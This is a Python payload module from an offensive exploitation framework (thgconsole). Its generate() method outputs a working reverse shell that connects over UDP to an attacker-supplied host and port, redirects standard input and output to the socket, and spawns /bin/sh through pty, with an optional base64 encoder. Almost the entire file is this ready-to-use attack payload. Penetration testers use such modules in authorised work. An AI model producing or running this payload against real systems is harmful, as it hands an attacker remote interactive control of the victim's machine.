from thgconsole.core.exploit.option import OptEncoder
from thgconsole.core.exploit.payloads import (
    GenericPayload,
    Architectures,
    ReverseTCPPayloadMixin,
)
from thgconsole.modules.encoders.python.base64 import Encoder


class Payload(ReverseTCPPayloadMixin, GenericPayload):
    __info__ = {
        "name": "Python Reverse UDP",
        "description": "Creates interactive udp reverse shell by using python.",
        "authors": (
            "Andre Marques (zc00l)",  # shellpop
            "Marcin Bury <marcin[at]threat9.com>"  # thgconsole module
        ),
    }

    architecture = Architectures.PYTHON
    encoder = OptEncoder(Encoder(), "Encoder")

    def generate(self):
        return (
            "import os\n" +
            "import pty\n" +
            "import socket\n" +
            "s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n" +
            "s.connect(('{}',{}))\n".format(self.lhost, self.lport) +
            "os.dup2(s.fileno(), 0)\n" +
            "os.dup2(s.fileno(), 1)\n" +
            "os.dup2(s.fileno(), 2)\n" +
            "pty.spawn('/bin/sh');\n" +
            "s.close()\n"
        )
